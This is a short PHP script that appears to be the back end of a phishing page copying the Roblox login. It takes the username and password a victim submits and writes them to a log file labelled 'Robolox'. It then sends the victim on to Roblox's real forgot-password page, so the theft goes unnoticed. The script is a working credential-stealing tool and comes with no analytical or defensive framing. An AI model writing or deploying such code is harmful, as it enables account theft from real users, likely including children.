<?php

header('Location: https://www.roblox.com/login/forgot-password-or-username/');
$data = array('site' => 'Robolox',
  'user' => $_POST['username'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>